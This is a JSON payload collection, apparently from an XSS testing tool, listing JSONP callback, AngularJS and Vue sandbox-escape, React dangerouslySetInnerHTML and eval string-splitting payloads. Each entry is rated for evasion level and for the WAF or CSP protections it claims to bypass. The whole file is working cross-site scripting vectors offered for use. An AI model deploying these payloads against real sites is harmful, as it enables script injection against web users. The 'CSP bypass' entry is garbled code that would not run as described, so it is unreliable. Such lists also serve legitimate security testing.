{
  "category": "jsonp_angular_escape",
  "description": "JSONP and AngularJS/Vue.js sandbox escape techniques for modern web frameworks",
  "difficulty": "expert",
  "payloads": [
    {
      "name": "jsonp_callback_xss",
      "payload": "<script src=\"https://evil.site/jsonp?callback=alert(1)\"></script>",
      "description": "Classic JSONP callback XSS exploitation",
      "context": ["html", "jsonp", "external"],
      "encoding": "none",
      "evasion_level": 6,
      "waf_bypass": ["basic", "jsonp_specific"]
    },
    {
      "name": "angular_constructor_escape",
      "payload": "{{constructor.constructor('alert(1)')()}}",
      "description": "AngularJS sandbox escape via constructor chain",
      "context": ["angular", "template", "sandbox_escape"],
      "encoding": "none", 
      "evasion_level": 8,
      "waf_bypass": ["angular_sandbox", "template_based"]
    },
    {
      "name": "vue_template_escape",
      "payload": "{{this.constructor.constructor('alert(1)')()}}",
      "description": "Vue.js template injection with constructor escape",
      "context": ["vue", "template", "sandbox_escape"],
      "encoding": "none",
      "evasion_level": 8,
      "waf_bypass": ["vue_sandbox", "template_based"]
    },
    {
      "name": "angular_csp_bypass",
      "payload": "{{a='constructor';b=a;c='alert(1)';d='';e=b;f=c;g=d;h=e[f](g)();}}",
      "description": "AngularJS CSP bypass with string concatenation",
      "context": ["angular", "csp_bypass", "template"],
      "encoding": "string_splitting",
      "evasion_level": 9,
      "waf_bypass": ["csp", "angular_sandbox"]
    },
    {
      "name": "react_dangerously_set",
      "payload": "{\"dangerouslySetInnerHTML\":{\"__html\":\"<img src=x onerror=alert(1)>\"}}",
      "description": "React dangerouslySetInnerHTML XSS vector",
      "context": ["react", "jsx", "dangerous_html"],
      "encoding": "none",
      "evasion_level": 7,
      "waf_bypass": ["react_specific", "jsx_based"]
    },
    {
      "name": "jsonp_eval_chain",
      "payload": "eval('al'+'ert(1)')",
      "description": "JSONP callback with eval and string concatenation",
      "context": ["jsonp", "eval", "string_concat"],
      "encoding": "string_splitting",
      "evasion_level": 7,
      "waf_bypass": ["basic", "string_detection"]
    }
  ]
}
